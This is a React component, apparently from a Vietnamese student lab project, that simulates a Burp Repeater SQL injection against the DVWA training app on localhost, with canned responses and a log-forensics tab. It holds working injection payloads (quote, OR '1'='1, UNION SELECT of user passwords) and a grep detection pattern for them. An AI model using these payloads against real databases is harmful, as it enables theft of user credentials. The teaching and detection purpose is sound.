"use client";

import { useState } from "react";
import { Bug, FileSearch, Play, Send } from "lucide-react";

interface Props {
  containerRef: string;
  phpsessid: string;
  activeTab?: string;
}

const LOG_LINES = [
  {
    ip: "172.17.0.1",
    time: "04/Nov/2026:02:13:44 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1&Submit=Submit",
    status: "200",
    bytes: "1780",
    ua: "Mozilla/5.0 (Burp Chromium)",
    suspicious: false,
  },
  {
    ip: "172.17.0.1",
    time: "04/Nov/2026:02:14:08 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1%27&Submit=Submit",
    status: "200",
    bytes: "1842",
    ua: "Mozilla/5.0 (Burp Chromium)",
    suspicious: true,
    iocNote: "Ký tự %27 (nháy đơn) kích hoạt lỗi cú pháp MariaDB",
  },
  {
    ip: "172.17.0.1",
    time: "04/Nov/2026:02:15:21 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit",
    status: "200",
    bytes: "2195",
    ua: "curl/8.5.0",
    suspicious: true,
    iocNote: "User-Agent là curl + Payload OR '1'='1 trả về dung lượng lớn (2195B)",
  },
  {
    ip: "172.17.0.1",
    time: "04/Nov/2026:02:16:05 +0000",
    method: "GET",
    uri: "/vulnerabilities/sqli/?id=1%20UNION%20SELECT%20user,password%20FROM%20users&Submit=Submit",
    status: "200",
    bytes: "2340",
    ua: "sqlmap/1.8.4#stable",
    suspicious: true,
    iocNote: "Từ khóa UNION SELECT + User-Agent lộ công cụ sqlmap",
  },
];

export function Member2Simulator({ containerRef, phpsessid, activeTab }: Props) {
  const [tab, setTab] = useState<"burp" | "logs">(
    activeTab === "m2-curl-log" ? "logs" : "burp"
  );
  const [payload, setPayload] = useState("1'");
  const [sentPayload, setSentPayload] = useState("1'");
  const [curlExecuted, setCurlExecuted] = useState(false);
  const [logsExecuted, setLogsExecuted] = useState(false);

  const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";
  const container = containerRef.trim() || "dvwa";

  const encodedPayload = encodeURIComponent(sentPayload);
  const hasQuoteOrSql =
    sentPayload.includes("'") || /or\s+1=1|union|select/i.test(sentPayload);
  const isOrTrue = /'\s*or\s*'1'='1/i.test(sentPayload);

  return (
    <div className="rounded-2xl border border-amber-500/30 bg-[#0b1120] p-4 shadow-xl sm:p-5">
      <div className="mb-4 flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
        <div>
          <h3 className="flex items-center gap-2 text-sm font-bold text-amber-300 sm:text-base">
            <Bug className="h-4 w-4" />
            Trình Mô phỏng Thực tế — Thành viên 2 (Burp Repeater & Log Forensics)
          </h3>
          <p className="text-xs text-slate-400">
            Proxy Listener: <code className="text-amber-200">127.0.0.1:8081</code> • Target:{" "}
            <code className="text-amber-200">http://localtest.me:8080</code>
          </p>
        </div>

        <div className="flex rounded-lg border border-slate-800 bg-slate-950 p-1 text-xs">
          <button
            type="button"
            onClick={() => setTab("burp")}
            className={`rounded-md px-3 py-1.5 font-medium transition ${
              tab === "burp"
                ? "bg-amber-500/20 text-amber-200"
                : "text-slate-400 hover:text-slate-200"
            }`}
          >
            1. Burp Suite Repeater (PoC 2)
          </button>
          <button
            type="button"
            onClick={() => setTab("logs")}
            className={`rounded-md px-3 py-1.5 font-medium transition ${
              tab === "logs"
                ? "bg-cyan-500/20 text-cyan-200"
                : "text-slate-400 hover:text-slate-200"
            }`}
          >
            2. cURL + grep & Log Forensics
          </button>
        </div>
      </div>

      {tab === "burp" ? (
        <div className="space-y-3">
          <div className="flex flex-wrap items-center gap-2 rounded-xl border border-slate-800 bg-slate-900/70 p-3">
            <span className="text-xs font-medium text-slate-300">Chọn Payload nhanh:</span>
            {[
              { label: "id = 1 (Hợp lệ)", val: "1" },
              { label: "id = 1' (Gây lỗi Syntax)", val: "1'" },
              { label: "id = ' OR '1'='1 (Dump 5 users)", val: "' OR '1'='1" },
            ].map((p) => (
              <button
                key={p.val}
                type="button"
                onClick={() => {
                  setPayload(p.val);
                  setSentPayload(p.val);
                }}
                className={`rounded-md border px-2.5 py-1 font-mono text-xs transition ${
                  payload === p.val
                    ? "border-amber-400 bg-amber-500/20 text-amber-200"
                    : "border-slate-700 bg-slate-950 text-slate-300 hover:border-slate-500"
                }`}
              >
                {p.label}
              </button>
            ))}

            <div className="ml-auto flex w-full items-center gap-2 sm:w-auto">
              <input
                type="text"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                aria-label="Payload id"
                className="w-full rounded-lg border border-slate-700 bg-[#050811] px-2.5 py-1 font-mono text-xs text-amber-200 focus:border-amber-400 focus:outline-none sm:w-44"
                placeholder="Nhập tham số id..."
              />
              <button
                type="button"
                onClick={() => setSentPayload(payload)}
                className="flex shrink-0 items-center gap-1.5 rounded-lg bg-amber-500 px-3 py-1.5 text-xs font-bold text-slate-950 transition hover:bg-amber-400"
              >
                <Send className="h-3.5 w-3.5" />
                Send
              </button>
            </div>
          </div>

          <div className="grid gap-3 lg:grid-cols-2">
            {/* Request Pane */}
            <div className="rounded-xl border border-slate-800 bg-[#050811] p-3.5 font-mono text-xs">
              <div className="mb-2 flex items-center justify-between border-b border-slate-800 pb-2">
                <span className="font-bold text-amber-300">REQUEST (Repeater)</span>
                <span className="text-[11px] text-slate-400">localtest.me:8080</span>
              </div>
              <pre className="overflow-x-auto leading-relaxed text-slate-200">
{`GET /vulnerabilities/sqli/?id=${encodedPayload}&Submit=Submit HTTP/1.1
Host: localtest.me:8080
User-Agent: Mozilla/5.0 (Burp Chromium)
Cookie: security=low; PHPSESSID=${session}
Connection: close`}
              </pre>
            </div>

            {/* Response Pane */}
            <div className="rounded-xl border border-slate-800 bg-[#050811] p-3.5 font-mono text-xs">
              <div className="mb-2 flex items-center justify-between border-b border-slate-800 pb-2">
                <span className="font-bold text-cyan-300">RESPONSE (MariaDB / DVWA)</span>
                <span
                  className={`rounded px-1.5 py-0.5 text-[10px] font-bold ${
                    isOrTrue
                      ? "bg-amber-500/20 text-amber-300"
                      : hasQuoteOrSql
                      ? "bg-rose-500/20 text-rose-300"
                      : "bg-emerald-500/20 text-emerald-300"
                  }`}
                >
                  {isOrTrue
                    ? "DUMPED 5 USERS"
                    : hasQuoteOrSql
                    ? "SQL SYNTAX ERROR (CWE-89)"
                    : "200 OK NORMAL"}
                </span>
              </div>

              {isOrTrue ? (
                <pre className="overflow-x-auto leading-relaxed text-amber-200">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ' OR '1'='1
First name: admin    | Surname: admin
First name: Gordon   | Surname: Brown
First name: Hack     | Surname: Me
First name: Pablo    | Surname: Picasso
First name: Bob      | Surname: Smith`}
                </pre>
              ) : hasQuoteOrSql ? (
                <pre className="overflow-x-auto leading-relaxed text-rose-300">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

<pre>You have an error in your SQL syntax; check the manual
that corresponds to your MariaDB server version for the right
syntax to use near '''${sentPayload}''' at line 1</pre>`}
                </pre>
              ) : (
                <pre className="overflow-x-auto leading-relaxed text-emerald-300">
{`HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html;charset=utf-8

ID: ${sentPayload}
First name: admin
Surname: admin`}
                </pre>
              )}
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="rounded-xl border border-slate-800 bg-[#050811] p-3.5">
            <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
              <span className="text-xs font-semibold text-cyan-300">
                PoC 2 (Phần 2): Tự động bóc tách dữ liệu bằng cURL + grep
              </span>
              <button
                type="button"
                onClick={() => setCurlExecuted(true)}
                className="flex items-center gap-1 rounded-md bg-cyan-500 px-3 py-1 text-xs font-bold text-slate-950 hover:bg-cyan-400"
              >
                <Play className="h-3 w-3" /> Chạy cURL + grep
              </button>
            </div>
            <pre className="overflow-x-auto font-mono text-xs text-slate-300">
{`ubuntu@vm1:~$ curl -s -b "security=low; PHPSESSID=${session}" \\
  "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -o "First name: [^<]*"`}
            </pre>
            {curlExecuted && (
              <div className="mt-2 rounded border border-emerald-500/40 bg-emerald-950/30 px-3 py-2 font-mono text-xs text-emerald-300">
                First name: admin
              </div>
            )}
          </div>

          <div className="rounded-xl border border-slate-800 bg-[#050811] p-3.5">
            <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
              <span className="flex items-center gap-1.5 text-xs font-semibold text-amber-300">
                <FileSearch className="h-3.5 w-3.5" />
                Nâng Band 9.5: Blue Team Log Forensics (/var/log/apache2/access.log)
              </span>
              <button
                type="button"
                onClick={() => setLogsExecuted(true)}
                className="flex items-center gap-1 rounded-md bg-amber-500 px-3 py-1 text-xs font-bold text-slate-950 hover:bg-amber-400"
              >
                <Play className="h-3 w-3" /> Quét dấu vết IoC
              </button>
            </div>
            <pre className="overflow-x-auto font-mono text-xs text-slate-300">
{`ubuntu@vm1:~$ docker exec ${container} grep -E "(\\%27|\\'|UNION|SELECT)" /var/log/apache2/access.log | tail -n 5`}
            </pre>

            {logsExecuted && (
              <div className="mt-3 space-y-2">
                {LOG_LINES.filter((l) => l.suspicious).map((log, i) => (
                  <div
                    key={i}
                    className="rounded-lg border border-rose-500/30 bg-rose-950/20 p-2.5 font-mono text-[11px]"
                  >
                    <div className="flex flex-wrap items-center gap-2 text-slate-200">
                      <span className="rounded bg-slate-800 px-1.5 py-0.5 text-cyan-300">
                        IP: {log.ip}
                      </span>
                      <span className="rounded bg-rose-500/20 px-1.5 py-0.5 text-rose-300">
                        HTTP {log.status} • {log.bytes} bytes
                      </span>
                      <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-amber-200">
                        UA: {log.ua}
                      </span>
                    </div>
                    <div className="mt-1.5 break-all text-slate-300">
                      &quot;{log.method} {log.uri} HTTP/1.1&quot;
                    </div>
                    <div className="mt-1 font-sans text-xs text-amber-300">
                      IoC phát hiện: {log.iocNote}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
